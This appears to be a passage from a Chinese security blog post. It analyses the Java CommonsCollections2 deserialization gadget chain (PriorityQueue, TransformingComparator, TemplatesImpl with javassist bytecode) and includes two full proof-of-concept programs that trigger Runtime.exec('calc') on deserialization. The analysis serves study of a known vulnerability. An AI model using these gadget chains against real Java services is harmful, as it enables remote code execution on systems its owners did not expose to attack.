Entry var5 = (Entry)var4.next();</span><br><span class="line">           String var6 = (String)var5.getKey();</span><br><span class="line">           Class var7 = (Class)var3.get(var6);</span><br><span class="line">           <span class="keyword">if</span> (var7 != <span class="keyword">null</span>) &#123;</span><br><span class="line">               Object var8 = var5.getValue();</span><br><span class="line">               <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                   var5.setValue((<span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(var8.getClass() + <span class="string">"["</span> + var8 + <span class="string">"]"</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h1 id="CommonsCollections2"><a href="#CommonsCollections2" class="headerlink" title="CommonsCollections2"></a>CommonsCollections2</h1><p>maven</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;4.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.javassist&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;javassist&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;3.25.0-GA&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>利用链</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">    PriorityQueue.readObject()</span><br><span class="line">        ...</span><br><span class="line">            TransformingComparator.compare()</span><br><span class="line">                InvokerTransformer.transform()</span><br><span class="line">                    Method.invoke()</span><br><span class="line">                        Runtime.exec()</span><br></pre></td></tr></table></figure><p>poc1</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ComCol2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[] &#123;</span><br><span class="line">                        String.class, Class[].class &#125;, new Object[] &#123;</span><br><span class="line">                        <span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        Object.class, Object[].class &#125;, new Object[] &#123;</span><br><span class="line">                        <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                        new Class[] &#123; String.class &#125;, new Object[]&#123;"calc"&#125;)&#125;);</span><br><span class="line"></span><br><span class="line">        TransformingComparator comparator = <span class="keyword">new</span> TransformingComparator(chain);</span><br><span class="line">        PriorityQueue queue = <span class="keyword">new</span> PriorityQueue(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        Field field = Class.forName(<span class="string">"java.util.PriorityQueue"</span>).getDeclaredField(<span class="string">"comparator"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(queue,comparator);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"./cc2"</span>));</span><br><span class="line">            outputStream.writeObject(queue);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"./cc2"</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个poc延用了cc1的后半段链，直接在最后触发了ChainedTransformer#transform方法导致rce。但是cc2在yso中的poc并不是这个，而是用到了一个新的点TemplatesImpl。   </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import javassist.ClassClassPath;</span><br><span class="line">import javassist.ClassPool;</span><br><span class="line">import javassist.CtClass;</span><br><span class="line">import org.apache.commons.collections4.Transformer;</span><br><span class="line">import org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line">import org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line">public class ComCol2 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Constructor constructor &#x3D; Class.forName(&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;).getDeclaredConstructor(String.class);</span><br><span class="line">        constructor.setAccessible(true);</span><br><span class="line">        InvokerTransformer transformer &#x3D; (InvokerTransformer) constructor.newInstance(&quot;newTransformer&quot;);</span><br><span class="line">        TransformingComparator comparator &#x3D; new TransformingComparator(transformer);</span><br><span class="line">        PriorityQueue queue &#x3D; new PriorityQueue(2);</span><br><span class="line">        &#x2F;&#x2F; javassist</span><br><span class="line">        ClassPool pool &#x3D; ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));</span><br><span class="line">        CtClass cc &#x3D; pool.makeClass(&quot;Demo&quot;);</span><br><span class="line">        String cmd &#x3D; &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        byte[] classBytes &#x3D; cc.toBytecode();</span><br><span class="line">        byte[][] targetByteCodes &#x3D; new byte[][]&#123;classBytes&#125;;</span><br><span class="line">        TemplatesImpl templates &#x3D; TemplatesImpl.class.newInstance();</span><br><span class="line">        setFieldValue(templates, &quot;_bytecodes&quot;, targetByteCodes);</span><br><span class="line">        &#x2F;&#x2F; 进入 defineTransletClasses() 方法需要的条件</span><br><span class="line">        setFieldValue(templates, &quot;_name&quot;, &quot;name&quot;);</span><br><span class="line">        setFieldValue(templates, &quot;_class&quot;, null);</span><br><span class="line">        Object[] queue_array &#x3D; new Object[]&#123;templates, 1&#125;;</span><br><span class="line"></span><br><span class="line">        Field queue_field &#x3D; Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;queue&quot;);</span><br><span class="line">        queue_field.setAccessible(true);</span><br><span class="line">        queue_field.set(queue, queue_array);</span><br><span class="line"></span><br><span class="line">        Field size &#x3D; Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;size&quot;);</span><br><span class="line">        size.setAccessible(true);</span><br><span class="line">        size.set(queue, 2);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Field comparator_field &#x3D; Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;);</span><br><span class="line">        comparator_field.setAccessible(true);</span><br><span class="line">        comparator_field.set(queue, comparator);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream bos &#x3D; new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos &#x3D; new ObjectOutputStream(bos);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(bos);</span><br><span class="line">        ObjectInputStream ois &#x3D; new ObjectInputStream(new ByteArrayInputStream(bos.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception &#123;</span><br><span class="line">        final Field field &#x3D; getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Field getField(final Class&lt;?&gt; clazz, final String fieldName) &#123;</span><br><span class="line">        Field field &#x3D; null;</span><br><span class="line">        try &#123;</span><br><span class="line">            field &#x3D; clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(true);</span><br><span class="line">        &#125; catch (NoSuchFieldException ex) &#123;</span><br><span class="line">            if (clazz.getSuperclass() !&#x3D; null) &#123;</span><br><span class="line">                field &#x3D; getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return field;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用过程</p><ol><li>发现PriorityQueue的readObject可以调用构造方法参数中的比较器参数的compare方法</li><li>接着发现TransformingComparator比较器可以利用compare方法以及其构造参数transformer调用任意对象的任意方法</li><li>又因为利用的是CommonsCollections4，所以之前的命令执行链不能使用，所以寻找了个新的命令执行点，只需调用该对象的newTransformer方法即可触发</li><li>新的命令执行点包含对Java字节码修改、加载、创建对象、反射等操作，分析起来也挺有意思</li></ol><p><img src="../../images/java/comcol/3.png" alt=""></p><p>分析过程：<br>javassist 带来的攻击面在于 Java 进行实例化对象的时候会调用 static 代码块   </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Jdemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, CannotCompileException, NotFoundException </span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        CtClass cc = pool.makeClass(<span class="string">"TestDemo"</span>);</span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"calc\");"</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        cc.writeFile();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestDemo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TestDemo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>TemplatesImpl类中存在加载字节码并创建实例的函数。  </p><p>进入 TemplatesImpl，TemplatesImpl#newTransformer 调用了 getTransletInstance</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title">newTransformer</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> TransformerConfigurationException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">    transformer = <span class="keyword">new</span> TransformerImpl(getTransletInstance(), _outputProperties,</span><br><span class="line">        _indentNumber, _tfactory);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_uriResolver != <span class="keyword">null</span>) &#123;</span><br><span class="line">        transformer.setURIResolver(_uriResolver);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;</span><br><span class="line">        transformer.setSecureProcessing(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> transformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入 getTransletInstance 方法中,如果 <code>_name</code> 不为null的值，<code>_class</code> 设置为 null，这样会调用 defineTransletClasses。 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Translet <span class="title">getTransletInstance</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (_name == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_class == <span class="keyword">null</span>) defineTransletClasses();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// The translet needs to keep a reference to all its auxiliary</span></span><br><span class="line">        <span class="comment">// class to prevent the GC from collecting them</span></span><br><span class="line">        AbstractTranslet translet = (AbstractTranslet)</span><br><span class="line">                _class[_transletIndex].getConstructor().newInstance();</span><br><span class="line">        translet.postInitialization();</span><br><span class="line">        translet.setTemplates(<span class="keyword">this</span>);</span><br><span class="line">        translet.setOverrideDefaultParser(_overrideDefaultParser);</span><br><span class="line">        translet.setAllowedProtocols(_accessExternalStylesheet);</span><br><span class="line">        <span class="keyword">if</span> (_auxClasses != <span class="keyword">null</span>) &#123;</span><br><span class="line">            translet.setAuxiliaryClasses(_auxClasses);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> translet;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (InstantiationException | IllegalAccessException |</span><br><span class="line">            NoSuchMethodException | InvocationTargetException e) &#123;</span><br><span class="line">        ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString(), e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进 defineTransletClases，注意几个问题</p><p><code>_class[i] = loader.defineClass(_bytecodes[i]);</code> 对 byte 进行了还原</p><p>需要设置父类为 AbstractTranslet ，默认状态下<code>_transletIndex</code> 的值为 -1，如果进入这个 if 比较后，会给<code>_transletIndex</code>附值至少为 0，不然会抛出异常。这里我们也不能通过反射的方式来设置<code>_transletIndex</code>的值，因为还是会进入到<code>_auxClasses</code>方法中，此方法会报出错误，无法正常的序列化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">defineTransletClasses</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_bytecodes == <span class="keyword">null</span>) &#123;</span><br><span class="line">        ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    TransletClassLoader loader = (TransletClassLoader)</span><br><span class="line">        AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedAction() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> Object <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">int</span> classCount = _bytecodes.length;</span><br><span class="line">        _class = <span class="keyword">new</span> Class[classCount];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            _auxClasses = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">            _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">            <span class="keyword">final</span> Class superClass = _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Check if this is the main class</span></span><br><span class="line">            <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                _transletIndex = i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_transletIndex &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            ErrorMsg err= <span class="keyword">new</span> ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (ClassFormatError e) &#123;</span><br><span class="line">        ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (LinkageError e) &#123;</span><br><span class="line">        ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>回到 TemplatesImpl#getTransletInstance 中，这里进行了实例化，也就是这里会调用我们 static 代码块的代码 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AbstractTranslet translet = (AbstractTranslet)</span><br><span class="line">                    _class[_transletIndex].getConstructor().newInstance();</span><br></pre></td></tr></table></figure><p>沿用之前 CC1 的思路，目前的核心目的是寻找调用 ChainedTransformer 的 transform 的类</p><p>看一下 TransformingComparator#compare ,在上面构造函数实例化对象的时候给 this.transformer 附值为传入的 transformer，这里直接调用 transform 方法，符合我们的构造条件 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">TransformingComparator</span><span class="params">(Transformer&lt;? <span class="keyword">super</span> I, ? extends O&gt; transformer, Comparator&lt;O&gt; decorated)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.decorated = decorated;</span><br><span class="line">    <span class="keyword">this</span>.transformer = transformer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(I obj1, I obj2)</span> </span>&#123;</span><br><span class="line">    O value1 = <span class="keyword">this</span>.transformer.transform(obj1);</span><br><span class="line">    O value2 = <span class="keyword">this</span>.transformer.transform(obj2);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后续寻找使用这个链的方法，利用链比较复杂，切换到正向PriorityQueue#readObject ，调用了 heapify 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// Read in size, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in (and discard) array length</span></span><br><span class="line">    s.readInt();</span><br><span class="line"></span><br><span class="line">    SharedSecrets.getJavaOISAccess().checkArray(s, Object[]<span class="class">.<span class="keyword">class</span>, <span class="title">size</span>)</span>;</span><br><span class="line">    queue = <span class="keyword">new</span> Object[size];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in all elements.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">        queue[i] = s.readObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Elements are guaranteed to be in "proper order", but the</span></span><br><span class="line">    <span class="comment">// spec has never explained what that might be.</span></span><br><span class="line">    heapify();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PriorityQueue#heapify 里调用了 siftDown ，但是这里有个条件就是要满足 int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0,size至少为2 </p><figure class="highlight 